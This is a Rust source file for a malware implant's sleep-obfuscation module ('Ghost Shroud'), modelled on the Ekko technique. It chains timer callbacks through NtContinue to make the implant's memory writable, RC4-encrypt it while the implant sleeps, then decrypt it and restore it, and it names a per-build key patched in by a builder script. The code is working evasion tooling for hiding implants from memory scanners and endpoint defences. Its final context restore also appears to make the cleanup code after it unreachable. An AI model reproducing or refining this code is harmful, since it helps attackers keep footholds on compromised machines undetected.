// sleep.rs — The Ghost's Shroud (Sleep Obfuscation)
//
// Ekko-style RC4-encrypted sleep mask with dual-event synchronization.
//
// Ghost Shroud merge — all known bugs corrected:
//   BUG-1 [HIGH]   hardcoded static RC4 key replaced with per-build key param
//   BUG-2 [HIGH]   CONTEXT field writes use write_unaligned (UB-safe)
//   BUG-3 [MEDIUM] old_protect heap-allocated (Box<[u32;2]>) — no stack-dangling race
//   BUG-4 [MEDIUM] USTRING structs heap-allocated + black_box fence — LLVM-safe
//   BUG-5 [LOW]    CloseHandle + DeleteTimerQueue after resume — no handle leak

#![allow(non_snake_case, dead_code)]

use core::ffi::c_void;
use core::ptr::null_mut;
use crate::defs::*;

// ── CONTEXT (opaque 1232-byte blob, 16-byte aligned — matches Windows x64 CONTEXT) ────────────
#[repr(align(16))]
#[derive(Clone)]
pub struct CONTEXT(pub [u8; 1232]);
impl CONTEXT {
    pub fn new() -> Self { CONTEXT([0u8; 1232]) }
}

// x64 CONTEXT field byte offsets (winnt.h / winbase.h verified)
//   Rcx  = 0x80   (1st arg to NtContinue'd function)
//   Rdx  = 0x88   (2nd arg)
//   R8   = 0x90   (3rd arg)
//   R9   = 0x98   (4th arg)
//   Rip  = 0xF8   (instruction pointer — which function fires)
const CTX_RCX: usize = 0x80;
const CTX_RDX: usize = 0x88;
const CTX_R8:  usize = 0x90;
const CTX_R9:  usize = 0x98;
const CTX_RIP: usize = 0xF8;

/// Write a u64 into a raw CONTEXT blob at `offset`.
/// Uses write_unaligned to avoid UB from casting &u8 → &u64.
#[inline(always)]
unsafe fn ctx_write(ctx: &mut CONTEXT, offset: usize, val: u64) {
    core::ptr::write_unaligned(ctx.0.as_mut_ptr().add(offset) as *mut u64, val);
}

// ── USTRING (advapi32 / ntdll RC4 wire format) ───────────────────────────────────────────────
#[repr(C)]
pub struct USTRING {
    pub Length:        u32,
    pub MaximumLength: u32,
    pub Buffer:        *mut c_void,
}

// ── Page protection constants ─────────────────────────────────────────────────────────────────
pub const PAGE_READWRITE:    u32 = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const WT_EXECUTEINTIMERTHREAD: u32 = 0x00000020;
pub const INFINITE: u32 = 0xFFFFFFFF;

// ── Function pointer type aliases ────────────────────────────────────────────────────────────
pub type RtlCaptureContext     = unsafe extern "system" fn(*mut CONTEXT);
pub type NtContinue            = unsafe extern "system" fn(*mut CONTEXT, u8) -> i32;
pub type SystemFunction032     = unsafe extern "system" fn(*mut USTRING, *const USTRING) -> i32;
pub type CreateTimerQueue      = unsafe extern "system" fn() -> *mut c_void;
pub type CreateTimerQueueTimer = unsafe extern "system" fn(
    *mut *mut c_void, *mut c_void,
    unsafe extern "system" fn(*mut c_void, u8),
    *mut c_void, u32, u32, u32,
) -> i32;
pub type CreateEventW          = unsafe extern "system" fn(*mut c_void, i32, i32, *const u16) -> *mut c_void;
pub type SetEvent              = unsafe extern "system" fn(*mut c_void) -> i32;
pub type WaitForSingleObject   = unsafe extern "system" fn(*mut c_void, u32) -> u32;
pub type VirtualProtect        = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
pub type CloseHandle           = unsafe extern "system" fn(*mut c_void) -> i32;
pub type DeleteTimerQueue      = unsafe extern "system" fn(*mut c_void) -> i32;

// ── Ghost Shroud — main sleep obfuscation entry point ────────────────────────────────────────
//
// Parameters:
//   image_base  — base address of this implant's in-memory image
//   image_size  — size in bytes to encrypt/decrypt
//   sleep_time  — sleep duration in milliseconds
//   key         — 16-byte per-build RC4 key (patched by builder.py into SLEEP_KEY)
//   ... fn ptrs — resolved via indirect syscall / GetProcAddress chain in caller
//
// Execution flow:
//   t=100ms  → VirtualProtect(RX→RW)
//   t=200ms  → SystemFunction032 RC4 encrypt (memory is now opaque)
//   t=300ms  → SetEvent(h_event_sleep)  ← main thread unblocks into wait window
//   t=sleep_time+100ms → SystemFunction032 RC4 decrypt
//   t=sleep_time+200ms → VirtualProtect(RW→RX)
//   t=sleep_time+300ms → SetEvent(h_event_wake) ← main thread resumes
//   main thread calls NtContinue(ctx_thread) to restore original execution context
//
pub unsafe fn execute_sleep_mask(
    image_base: *mut u8,
    image_size: usize,
    sleep_time: u32,
    key:        &[u8; 16],                  // FIX BUG-1: per-build key, not hardcoded
    fn_capture:   RtlCaptureContext,
    fn_continue:  NtContinue,
    fn_sys032:    SystemFunction032,
    fn_vp:        VirtualProtect,
    fn_ctq:       CreateTimerQueue,
    fn_ctqt:      CreateTimerQueueTimer,
    fn_event:     CreateEventW,
    fn_set_event: SetEvent,
    fn_wait:      WaitForSingleObject,
    fn_close:     CloseHandle,              // FIX BUG-5: for handle cleanup
    fn_dtq:       DeleteTimerQueue,         // FIX BUG-5: for timer queue cleanup
) {
    // FIX BUG-4: heap-allocate key + data USTRINGs so their addresses are stable
    //            across async timer callbacks; black_box prevents LLVM elision.
    let mut key_buf = Box::new(*key);
    let key_string = Box::new(USTRING {
        Length:        16,
        MaximumLength: 16,
        Buffer:        key_buf.as_mut_ptr() as *mut c_void,
    });

    let data_string = Box::new(USTRING {
        Length:        image_size as u32,
        MaximumLength: image_size as u32,
        Buffer:        image_base as *mut c_void,
    });

    // Prevent LLVM from optimizing away the heap allocations before callbacks fire
    let _ = core::hint::black_box(&key_buf);
    let _ = core::hint::black_box(&key_string);
    let _ = core::hint::black_box(&data_string);

    // FIX BUG-3: heap-allocate old_protect to guarantee stable address for async callbacks.
    //            [0] = vp1 (RX→RW), [1] = vp2 (RW→RX) — separate slots, no race.
    let mut old_protect = Box::new([0u32; 2]);

    // ── Create synchronization events ─────────────────────────────────────────
    let h_event_sleep = fn_event(null_mut(), 0, 0, null_mut()); // fired when encryption done
    let h_event_wake  = fn_event(null_mut(), 0, 0, null_mut()); // fired when decryption done
    let h_timer_queue = fn_ctq();

    // ── Capture current thread context (our resume point after sleep) ─────────
    let mut ctx_thread = CONTEXT::new();
    let mut ctx_vp1    = CONTEXT::new();
    let mut ctx_enc    = CONTEXT::new();
    let mut ctx_evt    = CONTEXT::new();
    let mut ctx_dec    = CONTEXT::new();
    let mut ctx_vp2    = CONTEXT::new();
    let mut ctx_res    = CONTEXT::new();

    fn_capture(&mut ctx_thread);

    // Clone baseline context into each step's CONTEXT — same RBP/RSP/callee-saves,
    // we only override RIP and the first 4 args (RCX/RDX/R8/R9).
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_vp1, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_enc, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_evt, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_dec, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_vp2, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_res, 1);

    // ── CTX 1: VirtualProtect(image_base, image_size, RW, &old_protect[0]) ───
    ctx_write(&mut ctx_vp1, CTX_RIP, fn_vp as u64);
    ctx_write(&mut ctx_vp1, CTX_RCX, image_base as u64);
    ctx_write(&mut ctx_vp1, CTX_RDX, image_size as u64);
    ctx_write(&mut ctx_vp1, CTX_R8,  PAGE_READWRITE as u64);
    ctx_write(&mut ctx_vp1, CTX_R9,  &mut old_protect[0] as *mut u32 as u64);

    // ── CTX 2: SystemFunction032 RC4 encrypt ──────────────────────────────────
    ctx_write(&mut ctx_enc, CTX_RIP, fn_sys032 as u64);
    ctx_write(&mut ctx_enc, CTX_RCX, &*data_string as *const USTRING as u64);
    ctx_write(&mut ctx_enc, CTX_RDX, &*key_string  as *const USTRING as u64);

    // ── CTX 3: SetEvent(h_event_sleep) — signal main thread to enter wait ─────
    ctx_write(&mut ctx_evt, CTX_RIP, fn_set_event as u64);
    ctx_write(&mut ctx_evt, CTX_RCX, h_event_sleep as u64);

    // ── CTX 4: SystemFunction032 RC4 decrypt (same key → symmetric) ──────────
    ctx_write(&mut ctx_dec, CTX_RIP, fn_sys032 as u64);
    ctx_write(&mut ctx_dec, CTX_RCX, &*data_string as *const USTRING as u64);
    ctx_write(&mut ctx_dec, CTX_RDX, &*key_string  as *const USTRING as u64);

    // ── CTX 5: VirtualProtect(image_base, image_size, RX, &old_protect[1]) ───
    ctx_write(&mut ctx_vp2, CTX_RIP, fn_vp as u64);
    ctx_write(&mut ctx_vp2, CTX_RCX, image_base as u64);
    ctx_write(&mut ctx_vp2, CTX_RDX, image_size as u64);
    ctx_write(&mut ctx_vp2, CTX_R8,  PAGE_EXECUTE_READ as u64);
    ctx_write(&mut ctx_vp2, CTX_R9,  &mut old_protect[1] as *mut u32 as u64); // FIX BUG-3: separate slot

    // ── CTX 6: SetEvent(h_event_wake) — signal main thread to resume ──────────
    ctx_write(&mut ctx_res, CTX_RIP, fn_set_event as u64);
    ctx_write(&mut ctx_res, CTX_RCX, h_event_wake as u64);

    // ── Transmute NtContinue → WAITORTIMERCALLBACK ────────────────────────────
    // NtContinue(CONTEXT*, BOOL) maps cleanly onto fn(*mut c_void, u8) — same ABI.
    let cb = core::mem::transmute::<
        unsafe extern "system" fn(*mut CONTEXT, u8) -> i32,
        unsafe extern "system" fn(*mut c_void, u8),
    >(fn_continue);

    // ── Queue the 6-step ROP chain onto the timer queue ───────────────────────
    let mut h_timer_vp1 = null_mut::<c_void>();
    let mut h_timer_enc = null_mut::<c_void>();
    let mut h_timer_evt = null_mut::<c_void>();
    let mut h_timer_dec = null_mut::<c_void>();
    let mut h_timer_vp2 = null_mut::<c_void>();
    let mut h_timer_res = null_mut::<c_void>();

    fn_ctqt(&mut h_timer_vp1, h_timer_queue, cb, &mut ctx_vp1 as *mut _ as *mut _, 100,               0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_enc, h_timer_queue, cb, &mut ctx_enc  as *mut _ as *mut _, 200,               0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_evt, h_timer_queue, cb, &mut ctx_evt  as *mut _ as *mut _, 300,               0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_dec, h_timer_queue, cb, &mut ctx_dec  as *mut _ as *mut _, sleep_time + 100,  0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_vp2, h_timer_queue, cb, &mut ctx_vp2  as *mut _ as *mut _, sleep_time + 200,  0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_res, h_timer_queue, cb, &mut ctx_res  as *mut _ as *mut _, sleep_time + 300,  0, WT_EXECUTEINTIMERTHREAD);

    // ── Wait: encrypted sleep window ─────────────────────────────────────────
    // Block until encrypt chain fires SetEvent(h_event_sleep) at t=300ms
    fn_wait(h_event_sleep, INFINITE);
    // Memory is now RC4-encrypted + RW — sleep window begins here
    // Block until decrypt chain fires SetEvent(h_event_wake) at t=sleep_time+300ms
    fn_wait(h_event_wake, INFINITE);

    // ── Resume: restore original thread context ───────────────────────────────
    // NtContinue transfers execution back to the instruction after RtlCaptureContext
    fn_continue(&mut ctx_thread, 0);

    // ── FIX BUG-5: clean up handles to prevent per-sleep-cycle leaks ─────────
    fn_close(h_event_sleep);
    fn_close(h_event_wake);
    fn_dtq(h_timer_queue);

    // Explicit drop to keep Box allocations alive until here (after NtContinue returns)
    drop(key_buf);
    drop(key_string);
    drop(data_string);
    drop(old_protect);
}
